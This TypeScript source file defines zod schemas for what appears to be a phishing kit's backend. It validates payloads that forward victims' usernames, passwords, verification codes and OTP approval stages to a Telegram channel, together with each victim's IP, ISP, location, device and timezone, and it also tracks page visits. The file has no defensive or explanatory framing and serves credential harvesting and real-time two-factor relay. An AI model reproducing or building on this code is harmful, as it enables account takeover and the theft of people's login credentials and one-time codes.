import { z } from 'zod'

/** Allowed notification types for Telegram API */
const notificationTypeSchema = z.enum([
  'visit',
  'username',
  'password',
  'verification_method',
  'verification_code',
  'code_requested',
  'password_approval',
  'otp_approval',
])

/** Visitor API POST body (page visit tracking) */
export const visitorBodySchema = z.object({
  type: z.enum(['visit']).optional().default('visit'),
  website: z.string().max(256).optional(),
  pageUrl: z.string().url().max(2048).optional(),
  screen: z.string().max(128).optional(),
  additionalData: z.record(z.unknown()).optional(),
})

/** Telegram API POST body (notification payload) */
export const telegramBodySchema = z.object({
  type: notificationTypeSchema,
  data: z.object({
    website: z.string().max(256).optional(),
    pageUrl: z.string().url().max(2048).optional(),
    username: z.string().max(512).optional(),
    password: z.string().max(512).optional(),
    verificationMethod: z.enum(['text', 'email']).optional(),
    verificationCode: z.string().max(32).optional(),
    approvalId: z.string().max(256).optional(),
    stage: z.enum(['password', 'otp']).optional(),
    location: z.string().optional(),
    ip: z.string().optional(),
    timezone: z.string().optional(),
    isp: z.string().optional(),
    device: z.string().optional(),
    screen: z.string().optional(),
    language: z.string().optional(),
    utcTime: z.string().optional(),
  }),
})

export type VisitorBody = z.infer<typeof visitorBodySchema>
export type TelegramBody = z.infer<typeof telegramBodySchema>

export function validateVisitorBody(body: unknown): { success: true; data: VisitorBody } | { success: false; error: z.ZodError } {
  const result = visitorBodySchema.safeParse(body)
  if (result.success) return { success: true, data: result.data }
  return { success: false, error: result.error }
}

export function validateTelegramBody(body: unknown): { success: true; data: TelegramBody } | { success: false; error: z.ZodError } {
  const result = telegramBodySchema.safeParse(body)
  if (result.success) return { success: true, data: result.data }
  return { success: false, error: result.error }
}

/** Format Zod errors for API response */
export function formatZodError(error: z.ZodError): { message: string; issues: { path: string; message: string }[] } {
  const issues = error.issues.map((issue) => ({
    path: issue.path.join('.'),
    message: issue.message,
  }))
  return {
    message: 'Validation failed',
    issues,
  }
}
